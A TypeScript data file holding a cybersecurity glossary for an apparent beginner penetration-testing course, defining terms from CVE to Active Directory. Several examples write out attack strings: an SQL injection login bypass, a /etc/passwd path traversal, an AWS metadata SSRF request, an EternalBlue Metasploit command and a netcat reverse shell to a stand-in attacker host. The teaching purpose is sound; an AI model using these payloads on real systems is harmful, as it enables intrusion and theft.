import type { GlossaryTerm } from "@/types"

export const GLOSSARY: GlossaryTerm[] = [
  {
    id: "cia-triad",
    term: "CIA Triad",
    fullName: "Confidentiality, Integrity, Availability",
    category: "Core Concept",
    definition:
      "The three foundational principles of information security. Every security control maps to at least one.",
    example:
      "Encrypting a file protects Confidentiality. A hash verifies Integrity. A backup ensures Availability.",
    learnMore: "NIST SP 800-12",
  },
  {
    id: "cve",
    term: "CVE",
    fullName: "Common Vulnerabilities and Exposures",
    category: "Vulnerability Mgmt",
    definition:
      "A unique public identifier for a specific known vulnerability (e.g. CVE-2021-44228).",
    example:
      "Log4Shell was CVE-2021-44228. Both attackers and defenders use this ID to communicate about the same flaw.",
    learnMore: "cve.mitre.org",
  },
  {
    id: "cwe",
    term: "CWE",
    fullName: "Common Weakness Enumeration",
    category: "Vulnerability Mgmt",
    definition:
      "A list of software/hardware weakness types (root causes). CVE describes an instance; CWE describes the class.",
    example:
      "CWE-79 = 'Improper Neutralisation of Input During Web Page Generation' — the root cause of all XSS.",
    learnMore: "cwe.mitre.org",
  },
  {
    id: "cvss",
    term: "CVSS",
    fullName: "Common Vulnerability Scoring System",
    category: "Vulnerability Mgmt",
    definition:
      "A framework for rating the severity of vulnerabilities on a 0.0-10.0 scale. Used to prioritise patching.",
    example: "CVSS 9.8 = Critical (patch today). CVSS 2.0 = Low (schedule for next maintenance window).",
    learnMore: "nvd.nist.gov",
  },
  {
    id: "ioc",
    term: "IOC",
    fullName: "Indicator of Compromise",
    category: "Threat Intel",
    definition:
      "Evidence that a system has been breached: suspicious IPs, domains, file hashes, registry keys, process names.",
    example: "Finding connections to a known C2 IP in firewall logs is an IOC.",
    learnMore: "MITRE ATT&CK",
  },
  {
    id: "apt",
    term: "APT",
    fullName: "Advanced Persistent Threat",
    category: "Threat Intel",
    definition:
      "A sophisticated long-term cyberattack (often state-sponsored) that gains and maintains stealthy network access.",
    example:
      "APT29 (Cozy Bear) is a Russian group that attacked US government networks for months before detection.",
    learnMore: "MITRE ATT&CK Groups",
  },
  {
    id: "zero-day",
    term: "Zero-Day",
    fullName: "Zero-Day Vulnerability",
    category: "Vulnerability Mgmt",
    definition: "A vulnerability unknown to the vendor with no available patch. Extremely dangerous.",
    example:
      "A zero-day in a browser's PDF engine could allow drive-by code execution on any visitor to a malicious page.",
    learnMore: "NVD | Zerodium",
  },
  {
    id: "ttps",
    term: "TTPs",
    fullName: "Tactics, Techniques, and Procedures",
    category: "Threat Intel",
    definition:
      "Describes HOW attackers operate: Tactics=goals, Techniques=how, Procedures=specific implementations.",
    example: "Tactic: Credential Access. Technique: Brute Force. Procedure: Using Hydra on SSH port 22.",
    learnMore: "MITRE ATT&CK",
  },
  {
    id: "mitre-attack",
    term: "MITRE ATT&CK",
    fullName: "MITRE Adversarial Tactics Techniques & Common Knowledge",
    category: "Threat Intel",
    definition:
      "A knowledge base of real-world adversary TTPs used by defenders to map threats to known actor behaviour.",
    example:
      "A SOC analyst maps a detected lateral movement technique to ATT&CK T1021 to find related detections.",
    learnMore: "attack.mitre.org",
  },
  {
    id: "ram",
    term: "RAM",
    fullName: "Random Access Memory",
    category: "Hardware",
    definition:
      "Volatile memory that holds data currently in use by the CPU. Lost when power is removed. Very fast.",
    example:
      "When you open a browser, it loads into RAM. Crash = data lost. Forensics can dump RAM to find artefacts.",
    learnMore: "—",
  },
  {
    id: "rom",
    term: "ROM",
    fullName: "Read-Only Memory",
    category: "Hardware",
    definition: "Non-volatile memory retaining data without power. Stores firmware like BIOS/UEFI.",
    example: "BIOS settings survive reboots because they are in EEPROM (a type of ROM).",
    learnMore: "—",
  },
  {
    id: "cpu",
    term: "CPU",
    fullName: "Central Processing Unit",
    category: "Hardware",
    definition:
      "The brain of the computer. Executes instructions. Relevant in security for understanding buffer overflows and processes.",
    example:
      "A buffer overflow exploit overwrites the return address on the stack, hijacking the CPU instruction pointer.",
    learnMore: "—",
  },
  {
    id: "bios-uefi",
    term: "BIOS/UEFI",
    fullName: "Basic Input Output System / Unified Extensible Firmware Interface",
    category: "Hardware",
    definition:
      "Firmware that initialises hardware at boot and loads the OS. UEFI is the modern replacement for legacy BIOS.",
    example:
      "UEFI Secure Boot prevents unsigned bootloader code — stops bootkits from persisting through reimaging.",
    learnMore: "—",
  },
  {
    id: "osi-model",
    term: "OSI Model",
    fullName: "Open Systems Interconnection Model",
    category: "Networking",
    definition:
      "A 7-layer conceptual framework for network communication: Physical, Data Link, Network, Transport, Session, Presentation, Application.",
    example: "Wireshark captures at Layer 2/3. XSS is a Layer 7 attack. A WAF defends at Layer 7.",
    learnMore: "RFC 1122",
  },
  {
    id: "dns",
    term: "DNS",
    fullName: "Domain Name System",
    category: "Networking",
    definition: "Translates domain names to IP addresses. The 'phone book' of the internet.",
    example:
      "DNS cache poisoning redirects users to attacker-controlled servers by corrupting DNS records.",
    learnMore: "RFC 1035",
  },
  {
    id: "vpn",
    term: "VPN",
    fullName: "Virtual Private Network",
    category: "Networking",
    definition:
      "Encrypts internet traffic and tunnels it through a server, masking real IP and protecting data in transit.",
    example: "TryHackMe and HackTheBox require VPN connections to access their lab networks.",
    learnMore: "—",
  },
  {
    id: "owasp",
    term: "OWASP",
    fullName: "Open Web Application Security Project",
    category: "Web Security",
    definition:
      "Non-profit producing the OWASP Top 10 — the most critical web application vulnerabilities ranked by prevalence.",
    example:
      "The OWASP Top 10 includes SQL Injection, XSS, and Broken Access Control. Essential reading for any web pentester.",
    learnMore: "owasp.org",
  },
  {
    id: "xss",
    term: "XSS",
    fullName: "Cross-Site Scripting",
    category: "Web Security",
    definition:
      "Injection attack where malicious scripts are injected into trusted websites and run in victims' browsers.",
    example:
      "Stored XSS in a comment box executes JS in every visitor's browser, stealing their session cookies.",
    learnMore: "PortSwigger Academy",
  },
  {
    id: "sqli",
    term: "SQLi",
    fullName: "SQL Injection",
    category: "Web Security",
    definition:
      "Inserting malicious SQL into a query to manipulate the database — read, modify, or delete data.",
    example: "Entering ' OR '1'='1-- in a login field can bypass authentication.",
    learnMore: "PortSwigger Academy",
  },
  {
    id: "ssrf",
    term: "SSRF",
    fullName: "Server-Side Request Forgery",
    category: "Web Security",
    definition:
      "Tricks the server into making HTTP requests to internal resources or unintended external services.",
    example:
      "SSRF payload http://169.254.169.254/latest/meta-data/ reads AWS instance metadata from a vulnerable app.",
    learnMore: "PortSwigger Academy",
  },
  {
    id: "rce",
    term: "RCE",
    fullName: "Remote Code Execution",
    category: "Vulnerability",
    definition: "A class of vulnerability allowing an attacker to run arbitrary code on a remote system.",
    example: "Log4Shell (CVE-2021-44228) was RCE — attackers could run commands on any vulnerable Java server.",
    learnMore: "NVD",
  },
  {
    id: "lfi",
    term: "LFI",
    fullName: "Local File Inclusion",
    category: "Web Security",
    definition: "Including local server files via user input. Can read /etc/passwd or source code.",
    example: "?page=../../../../etc/passwd reads the password file on a vulnerable PHP application.",
    learnMore: "OWASP Testing Guide",
  },
  {
    id: "idor",
    term: "IDOR",
    fullName: "Insecure Direct Object Reference",
    category: "Web Security",
    definition: "Broken Access Control: an object reference (ID) is exposed and not validated.",
    example: "Changing /api/user/123 to /api/user/124 to view another user's private data.",
    learnMore: "PortSwigger Academy",
  },
  {
    id: "payload",
    term: "Payload",
    fullName: "Payload",
    category: "Exploitation",
    definition:
      "The component of an exploit that performs the malicious action after a vulnerability is triggered.",
    example: "A Metasploit reverse_tcp payload opens a shell back to the attacker after exploiting a service.",
    learnMore: "—",
  },
  {
    id: "c2",
    term: "C2",
    fullName: "Command and Control",
    category: "Exploitation",
    definition:
      "Infrastructure used by attackers to issue commands to compromised systems and receive stolen data.",
    example: "Malware beacons to a C2 server every 30 seconds to check for new commands.",
    learnMore: "MITRE ATT&CK T1071",
  },
  {
    id: "privesc",
    term: "Privesc",
    fullName: "Privilege Escalation",
    category: "Exploitation",
    definition:
      "Gaining higher access than originally obtained. Vertical = low user to admin/root. Horizontal = another user's access.",
    example: "Exploiting a misconfigured SUID binary (e.g. /usr/bin/find) to escalate from www-data to root.",
    learnMore: "GTFOBins | HackTricks",
  },
  {
    id: "lateral-movement",
    term: "Lateral Movement",
    fullName: "Lateral Movement",
    category: "Exploitation",
    definition: "Techniques to move from one compromised host to others within a network.",
    example:
      "After compromising a developer's laptop, using Pass-the-Hash to authenticate to the domain controller.",
    learnMore: "MITRE ATT&CK T1021",
  },
  {
    id: "hash",
    term: "Hash",
    fullName: "Cryptographic Hash",
    category: "Cryptography",
    definition:
      "One-way function converting any data into a fixed-length string. Cannot be reversed (only cracked).",
    example:
      "MD5('password')=5f4dcc3b5aa765d61d8327deb882cf99. Cracking leaked hashes offline is a standard post-exploitation step.",
    learnMore: "CryptoHack.org",
  },
  {
    id: "pentest",
    term: "Pentest",
    fullName: "Penetration Test",
    category: "Career",
    definition: "An authorised simulated attack on a system to find vulnerabilities before real attackers do.",
    example: "A company hires a pentesting firm to attack their app before launch. Findings are reported and fixed.",
    learnMore: "PTES Standard",
  },
  {
    id: "ejpt",
    term: "eJPT",
    fullName: "eLearnSecurity Junior Penetration Tester",
    category: "Certification",
    definition:
      "Entry-level pentesting cert by INE. Good first milestone after completing this programme.",
    example: "After this programme you should be ready to attempt the eJPT exam.",
    learnMore: "ine.com",
  },
  {
    id: "oscp",
    term: "OSCP",
    fullName: "Offensive Security Certified Professional",
    category: "Certification",
    definition:
      "Highly respected cert by OffSec. 24-hour practical exam. Often required for senior pentester roles.",
    example: "Target OSCP 1-2 years after eJPT. Requires HTB/VulnMachines practice.",
    learnMore: "offensive-security.com",
  },
  // --- Additional 10 terms ---
  {
    id: "siem",
    term: "SIEM",
    fullName: "Security Information and Event Management",
    category: "Threat Intel",
    definition:
      "A platform that aggregates and correlates logs across an organisation to detect and alert on suspicious activity.",
    example: "A SOC analyst queries Splunk (a SIEM) to correlate failed logins across 40 servers in 5 minutes.",
    learnMore: "Splunk | Microsoft Sentinel",
  },
  {
    id: "soc",
    term: "SOC",
    fullName: "Security Operations Center",
    category: "Career",
    definition:
      "A team (and often a physical/virtual room) responsible for monitoring, detecting, and responding to security incidents 24/7.",
    example: "Tier 1 SOC analysts triage SIEM alerts; Tier 3 analysts perform deep-dive incident response.",
    learnMore: "TryHackMe SOC Level 1",
  },
  {
    id: "edr",
    term: "EDR",
    fullName: "Endpoint Detection and Response",
    category: "Networking",
    definition:
      "Software agents on endpoints that monitor behaviour in real time and can isolate or remediate compromised machines.",
    example: "CrowdStrike Falcon (an EDR) auto-isolates a laptop the moment it detects ransomware-like file encryption.",
    learnMore: "CrowdStrike | Microsoft Defender for Endpoint",
  },
  {
    id: "waf",
    term: "WAF",
    fullName: "Web Application Firewall",
    category: "Web Security",
    definition:
      "A firewall that inspects HTTP/HTTPS traffic for malicious patterns (SQLi, XSS payloads) and blocks them before reaching the app.",
    example: "Cloudflare's WAF blocks a request containing ' OR 1=1-- before it ever reaches the origin server.",
    learnMore: "OWASP WAF Guide",
  },
  {
    id: "ngfw",
    term: "NGFW",
    fullName: "Next-Generation Firewall",
    category: "Networking",
    definition:
      "A firewall combining traditional packet filtering with deep packet inspection, intrusion prevention, and application awareness.",
    example: "A Palo Alto NGFW blocks traffic based on the specific app (e.g. BitTorrent) rather than just port number.",
    learnMore: "Palo Alto Networks",
  },
  {
    id: "active-directory",
    term: "Active Directory",
    fullName: "Active Directory Domain Services",
    category: "Networking",
    definition:
      "Microsoft's directory service for centrally managing users, computers, and permissions across a corporate Windows network.",
    example: "BloodHound maps AD trust relationships to find the shortest attack path to Domain Admin.",
    learnMore: "Microsoft Docs | TryHackMe AD Basics",
  },
  {
    id: "burp-suite",
    term: "Burp Suite",
    fullName: "Burp Suite",
    category: "Web Security",
    definition:
      "The industry-standard intercepting proxy for web application penetration testing — captures, modifies, and replays HTTP traffic.",
    example: "Using Burp Repeater to manually resend a modified SQLi payload dozens of times while tuning it.",
    learnMore: "PortSwigger",
  },
  {
    id: "metasploit",
    term: "Metasploit",
    fullName: "Metasploit Framework",
    category: "Exploitation",
    definition:
      "An open-source exploitation framework bundling exploit modules, payloads, and post-exploitation tools behind msfconsole.",
    example: "`use exploit/windows/smb/ms17_010_eternalblue` loads the EternalBlue module inside msfconsole.",
    learnMore: "rapid7.com/metasploit",
  },
  {
    id: "shodan",
    term: "Shodan",
    fullName: "Shodan Search Engine",
    category: "Threat Intel",
    definition:
      "A search engine that indexes internet-connected devices and their exposed banners/services, used heavily in passive recon.",
    example: "Searching `hostname:\"example.com\"` on Shodan reveals every internet-facing host and open port for that domain.",
    learnMore: "shodan.io",
  },
  {
    id: "reverse-shell",
    term: "Reverse Shell",
    fullName: "Reverse Shell",
    category: "Exploitation",
    definition:
      "A shell session initiated FROM the compromised target back TO the attacker's listener, bypassing inbound firewall rules.",
    example: "`nc -e /bin/sh attacker_ip 4444` connects out from a compromised web server to the attacker's netcat listener.",
    learnMore: "MITRE ATT&CK T1059",
  },
]

export const GLOSSARY_CATEGORIES = Array.from(new Set(GLOSSARY.map((g) => g.category))).sort()
